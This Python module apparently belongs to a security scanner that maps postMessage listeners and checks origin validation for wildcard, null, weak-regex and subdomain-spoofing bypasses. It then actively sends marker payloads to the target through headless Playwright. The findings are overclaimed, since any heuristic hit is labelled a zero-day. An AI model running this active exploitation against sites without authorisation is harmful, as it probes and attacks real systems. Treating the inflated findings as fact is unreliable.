"""
ABSA PostMessage Vulnerability Scanner
Aggressively maps message event listeners and bypasses origin validations
using null, regex, and subdomain spoofing techniques.
"""

import json
import re
from typing import Dict, List, Optional, Any
from datetime import datetime

from core.models import Finding, Severity, FindingType, Payload
from utils.logger import get_logger

logger = get_logger("browser.postmessage")


class PostMessageScanner:
    """Maps and exploits PostMessage origin validation flaws."""

    def __init__(self, context: Any, client: Any):
        self.ctx = context
        self.client = client
        self.base_url = context.target_url.rstrip('/')

    async def run(self, config: Optional[Dict] = None) -> List[Finding]:
        findings = []
        logger.info("Starting Aggressive PostMessage Scanner for %s", self.base_url)

        js_files = await self._discover_js_and_html()

        for file_path in js_files:
            source = await self._fetch_file(file_path)
            if not source: continue

            listeners = self._find_listeners(source)
            if not listeners: continue

            for listener in listeners:
                if not listener.get('validation'):
                    findings.append(self._create_finding(file_path, "Missing Origin Check", listener))
                else:
                    bypasses = self._check_bypasses(listener['validation'])
                    if bypasses:
                        findings.append(self._create_finding(file_path, f"Bypass: {bypasses}", listener))

        findings.extend(await self._active_exploit())

        return findings

    async def _discover_js_and_html(self) -> List[str]:
        paths = [self.base_url]
        resp = await self.client.get(self.base_url)
        if resp and resp.get("status") == 200:
            body = resp.get("body", "")
            paths.extend(re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', body))
            paths.extend(re.findall(r'href=["\']([^"\']+\.html?[^"\']*)["\']', body))
        return paths

    async def _fetch_file(self, path: str) -> Optional[str]:
        url = path if path.startswith("http") else f"{self.base_url}{path}"
        resp = await self.client.get(url)
        return resp.get("body", "") if resp and resp.get("status") == 200 else None

    def _find_listeners(self, source: str) -> List[Dict]:
        listeners = []
        patterns = [
            r'addEventListener\s*\(\s*["\']message["\']\s*,\s*(async\s*)?(\w+)\s*\)',
            r'onmessage\s*=\s*(async\s*)?(\w+)',
        ]

        for pat in patterns:
            matches = re.finditer(pat, source, re.I)
            for match in matches:
                func_name = match.group(2)
                func_start = match.end()
                snippet = source[func_start:func_start + 500]

                validation = None
                if "origin" in snippet or "event.origin" in snippet or "event.source" in snippet:
                    if "===" in snippet or "!==" in snippet or "indexOf" in snippet or "includes" in snippet:
                        validation = snippet[:200]

                listeners.append({"function": func_name, "validation": validation})
        return listeners

    def _check_bypasses(self, validation_code: str) -> Optional[str]:
        vuln = None
        val_lower = validation_code.lower()

        if "*" in validation_code:
            vuln = "Wildcard '*' origin accepted"
        elif "null" in val_lower and ("||" in validation_code or "==" in validation_code):
            vuln = "Null origin bypass"
        elif "regex" in val_lower or "match(" in val_lower or "test(" in val_lower:
            if "^" not in validation_code or "\\" not in validation_code:
                vuln = "Weak Regex bypass"
        elif "indexOf" in val_lower or "includes" in val_lower:
            if "split" not in val_lower and "hostname" not in val_lower:
                vuln = "Subdomain spoofing (indexOf bypass)"

        return vuln

    async def _active_exploit(self) -> List[Finding]:
        findings = []
        try:
            from playwright.async_api import async_playwright

            payloads = [
                {"action": "takeover", "html": "<h1>PWNED</h1>"},
                {"command": "execute", "code": "document.title='XSS'"},
            ]

            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)

                attacker_page = await browser.new_page()
                await attacker_page.goto("https://example.com")

                target_page = await browser.new_page()
                await target_page.goto(self.base_url, wait_until="networkidle")

                for payload in payloads:
                    try:
                        result = await attacker_page.evaluate(f"""
                            () => {{
                                return new Promise((resolve) => {{
                                    window.addEventListener('message', (e) => resolve(e.data));
                                    const w = window.open('{self.base_url}', '_blank');
                                    if(w) w.postMessage({json.dumps(payload)}, '*');
                                }});
                            }}
                        """)
                        if result:
                            findings.append(Finding(
                                title="EXPLOIT: PostMessage Origin Bypass Executed",
                                description="Successfully sent cross-origin message and received response/data back.",
                                severity=Severity.CRITICAL, finding_type=FindingType.ZERO_DAY, cwe_id="CWE-346",
                                cvss_score=9.0, affected_url=self.base_url,
                                evidence=f"Sent: {json.dumps(payload)}\nReceived: {str(result)[:200]}",
                                payloads=[
                                    Payload(payload_string=json.dumps(payload), payload_type="postmessage_exploit",
                                            evidence="Data received", success=True)],
                                remediation="Strictly validate event.origin === 'https://yourdomain.com'. Never use '*' or allow null.",
                                phase="browser_postmessage", weakness_type="PostMessage Hijack",
                                discovered_at=datetime.utcnow().isoformat(),
                            ))
                            break
                    except Exception:
                        continue

                await browser.close()
        except ImportError:
            pass
        except Exception as e:
            logger.error("Active PostMessage exploit error: %s", e)

        return findings

    def _create_finding(self, file_path: str, desc: str, listener: Dict) -> Finding:
        return Finding(
            title=f"Zero-Day: PostMessage Vulnerability ({desc})",
            description=f"Found window message listener '{listener['function']}' with flaw: {desc}",
            severity=Severity.HIGH, finding_type=FindingType.ZERO_DAY, cwe_id="CWE-346",
            cvss_score=7.5, affected_url=f"{self.base_url}{file_path}",
            evidence=f"Function: {listener['function']}\nValidation: {listener['validation'] or 'None'}",
            remediation="Implement strict origin equality check. Never accept '*' or 'null'.",
            phase="browser_postmessage", weakness_type="PostMessage Flaw", discovered_at=datetime.utcnow().isoformat(),
        )